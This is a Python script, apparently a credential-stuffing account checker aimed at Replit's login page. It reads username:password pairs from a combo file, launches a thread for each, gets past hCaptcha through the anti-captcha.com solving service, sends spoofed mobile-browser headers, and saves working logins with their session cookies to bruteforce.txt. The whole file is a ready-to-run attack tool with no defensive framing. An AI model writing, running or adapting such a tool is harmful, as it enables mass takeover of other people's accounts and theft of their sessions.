import requests
import threading

key = "ANTI CAP KEY HERE"


def solve():
    initialReq = requests.post(
        f"https://api.anti-captcha.com/createTask",
        json={
            "clientKey": key,
            "task": {
                "type": "HCaptchaTaskProxyless",
                "websiteURL": "https://replit.com/login",
                "websiteKey": "473079ba-e99f-4e25-a635-e9b661c7dd3e",
                "isInvisible": False,
            },
            "softId": 0,
        },
    )
    if "taskId" in initialReq.json():
        task = str(int(initialReq.json()["taskId"]))
    else:
        return
    while True:
        info = requests.post(
            f"https://api.anti-captcha.com/getTaskResult",
            json={"clientKey": key, "taskId": task},
        )
        print(info.text)
        if info.json()["status"] == "ready":
            return info.json()["solution"]["gRecaptchaResponse"]


def login(username, password):
    print("Checking", username, password)
    session = requests.session()
    session.headers = {
        "authority": "replit.com",
        "accept": "application/json",
        "accept-language": "en-US,en;q=0.9",
        "content-type": "application/json",
        "origin": "https://replit.com",
        "referer": "https://replit.com/login",
        "sec-ch-ua": '"Chromium";v="107", "Not=A?Brand";v="24"',
        "sec-ch-ua-mobile": "?1",
        "sec-ch-ua-platform": '"Android"',
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-origin",
        "user-agent": "Mozilla/5.0 (Linux; Android 9; moto g(6) play) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36",
        "x-requested-with": "XMLHttpRequest",
    }

    response = session.post(
        "https://replit.com/login",
        json={
            "username": username,
            "password": password,
            "teacher": True,
            "hCaptchaResponse": solve(),
            "hCaptchaSiteKey": "473079ba-e99f-4e25-a635-e9b661c7dd3e",
        },
    )
    if username in response.text:
        open("bruteforce.txt", "a").write(f"\n{username}:{password}:{response.cookies}")
    print(response.text)


for i in open("combos.txt").read().splitlines():
    i = i.split(":")
    u, p = i[0], i[1]
    threading.Thread(
        target=login,
        args=(
        u, 
        p,
        ),
    ).start()
